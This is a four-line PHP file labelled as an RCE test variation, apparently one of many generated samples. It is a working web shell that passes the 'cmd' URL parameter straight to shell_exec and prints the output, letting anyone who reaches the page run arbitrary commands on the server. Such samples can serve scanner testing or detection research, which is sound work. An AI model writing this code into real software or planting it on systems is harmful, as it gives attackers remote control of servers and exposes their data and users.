<?php
// RCE test variation #1069
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>